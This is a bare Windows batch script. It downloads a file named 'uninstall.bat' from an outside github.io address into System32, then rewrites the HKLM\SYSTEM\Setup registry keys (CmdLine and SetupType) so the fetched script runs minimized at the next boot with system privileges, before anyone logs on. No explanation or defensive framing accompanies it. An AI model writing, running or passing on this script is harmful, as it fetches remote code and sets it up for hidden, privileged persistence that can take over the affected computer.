@echo off
curl -o C:\Windows\System32\uninstall.bat https://lunitely.github.io/uninstall.bat
reg delete "HKLM\SYSTEM\Setup" /v CmdLine /f
reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d "C:\Windows\System32\cmd.exe /c start /min cmd.exe /c C:\Windows\System32\uninstall.bat"
reg delete "HKLM\SYSTEM\Setup" /v SetupType /f
reg add "HKLM\SYSTEM\Setup" /v SetupType /t REG_DWORD /d 2
